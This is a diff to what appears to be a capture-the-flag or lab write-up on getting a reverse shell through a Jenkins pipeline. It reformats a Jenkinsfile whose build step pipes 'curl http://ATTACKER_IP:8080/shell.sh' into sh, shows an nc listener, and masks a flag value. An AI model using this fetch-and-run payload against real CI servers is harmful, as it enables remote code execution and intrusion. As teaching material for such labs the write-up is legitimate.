@@ -36,14 +36,14 @@ nc -lvp 8081
 * Edit Jenkinsfile (replacing `ATTACKER_IP`):
 ```
 pipeline {
-	agent any
-	stages {
-		stage('build') {
-			steps {
-				sh 'curl http://ATTACKER_IP:8080/shell.sh | sh'
-			}
-		}
-	}
+  agent any
+  stages {
+    stage('build') {
+      steps {
+	    sh 'curl http://ATTACKER_IP:8080/shell.sh | sh'
+	  }
+    }
+  }
 }
 ```
 * Commit changes
@@ -120,7 +120,6 @@ Ready to verify? [Y/X/Z]:
 ```
 * Execute the steps in **JAgent** using the reverse shell:
 ```shell
-echo 124e04d2-703a-4eb1-b80b-55df716ef058 > /flag/myuser.txt
 echo xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx > /flag/myuser.txt
 ```
 * Back to **mother** proceed with the verification:
